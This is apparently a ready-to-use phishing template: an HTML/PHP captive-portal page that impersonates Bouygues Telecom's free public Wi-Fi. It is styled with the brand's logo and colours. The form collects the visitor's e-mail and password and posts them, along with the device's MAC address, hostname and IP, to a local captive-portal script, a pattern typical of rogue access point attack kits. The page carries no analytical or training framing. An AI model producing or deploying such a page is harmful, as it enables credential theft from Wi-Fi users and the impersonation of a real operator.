<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wi-Fi Public Gratuit Bouygues</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
    /* Fond animé dégradé Bouygues */
    body {
        margin: 0;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        background: linear-gradient(-45deg, #0070c9, #005a9c, #00a0e3, #0d0d0d);
        background-size: 400% 400%;
        animation: gradientBG 15s ease infinite;
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    }

    @keyframes gradientBG {
        0% {background-position:0% 50%;}
        50% {background-position:100% 50%;}
        100% {background-position:0% 50%;}
    }

    /* Carte principale */
    .card {
        backdrop-filter: blur(20px);
        background-color: rgba(17,17,17,0.85);
        border-radius: 2rem;
        padding: 2.5rem;
        max-width: 420px;
        width: 90%;
        box-shadow: 0 12px 40px rgba(0,0,0,0.7);
        color: #fff;
        position: relative;
        transition: transform 0.3s;
    }

    .card:hover {
        transform: translateY(-5px);
    }

    /* Logo Bouygues */
    .logo {
        display: block;
        margin: 0 auto 20px auto;
        max-width: 140px;
    }

    /* Titres */
    h1 {
        font-size: 1.5rem;
        font-weight: bold;
        text-align: center;
        color: #00a0e3;
        margin-bottom: 30px;
    }

    /* Inputs */
    .form-control {
        background-color: rgba(26,26,26,0.8);
        border: none;
        border-radius: 1rem;
        color: #fff;
        padding: 16px 18px;
        transition: all 0.3s;
    }

    .form-control:focus {
        box-shadow: 0 0 0 0.25rem rgba(0,112,201,0.5);
        background-color: rgba(26,26,26,0.9);
        color: #fff;
    }

    .form-label {
        color: #ccc;
        transition: color 0.3s, transform 0.3s;
    }

    /* Bouton gradient animé */
    .btn-gradient {
        background: linear-gradient(45deg, #0070c9, #00a0e3);
        border: none;
        font-weight: bold;
        transition: 0.4s;
    }

    .btn-gradient:hover {
        background: linear-gradient(45deg, #00a0e3, #0070c9);
    }

    /* Bouton voir mot de passe */
    .toggle-password {
        position: absolute;
        right: 18px;
        top: 38px;
        background: none;
        border: none;
        color: #ccc;
        font-size: 20px;
        cursor: pointer;
        transition: color 0.3s;
    }
    .toggle-password:hover { color: #00a0e3; }

    .error-message {
        display: none;
        font-size: 0.8rem;
        color: #ff4d4f;
        margin-top: 0.25rem;
    }

    /* Checkbox & link */
    .form-check-label {
        color: #ccc;
    }

    .text-info { color: #00a0e3 !important; }

    @media (max-width: 500px) {
        .card { padding: 2rem; }
        h1 { font-size: 1.3rem; }
    }
</style>
</head>
<body>

<div class="card shadow">
    <img src="/bouygue_free_wifi/assets/bouygue.jpg" alt="Bouygues Logo" class="logo">
    <h1>Wi-Fi Public Gratuit fourni par votre opérateur Bouygues</h1>

    <form id="loginForm" method="POST" action="/captiveportal/index.php" class="position-relative">
        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
        <input type="hidden" name="target" value="<?=$destination?>">

        <!-- Email -->
        <div class="mb-3 position-relative">
            <label for="email" class="form-label">Adresse e-mail</label>
            <input type="email" class="form-control" id="email" name="email" required>
            <div class="error-message" id="emailError">Email invalide</div>
        </div>

        <!-- Password -->
        <div class="mb-3 position-relative">
            <label for="password" class="form-label">Mot de passe</label>
            <input type="password" class="form-control" id="password" name="password" required>
            <button type="button" class="toggle-password" id="togglePw">👁️</button>
            <div class="error-message" id="passwordError">Mot de passe requis</div>
        </div>

        <!-- Remember & Help -->
        <div class="d-flex justify-content-between align-items-center mb-4">
            <div class="form-check">
                <input class="form-check-input" type="checkbox" id="remember" name="remember">
                <label class="form-check-label" for="remember">Se souvenir de moi</label>
            </div>
            <a href="#" class="text-info">Besoin d'aide ?</a>
        </div>

        <button type="submit" class="btn btn-gradient w-100 py-3 rounded-pill">Se connecter</button>
    </form>
</div>

<script>
    // Toggle mot de passe
    const togglePw = document.getElementById('togglePw');
    const password = document.getElementById('password');

    togglePw.addEventListener('click', () => {
        if(password.type === 'password'){
            password.type = 'text';
            togglePw.textContent = '🙈';
        } else {
            password.type = 'password';
            togglePw.textContent = '👁️';
        }
    });

    // Validation simple
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', (e) => {
        let valid = true;
        const email = document.getElementById('email');
        const password = document.getElementById('password');
        const emailError = document.getElementById('emailError');
        const passwordError = document.getElementById('passwordError');

        emailError.style.display = 'none';
        passwordError.style.display = 'none';

        if(!email.value.includes('@')){
            emailError.style.display = 'block';
            valid = false;
        }
        if(password.value.trim() === ''){
            passwordError.style.display = 'block';
            valid = false;
        }

        if(!valid) e.preventDefault();
    });
</script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
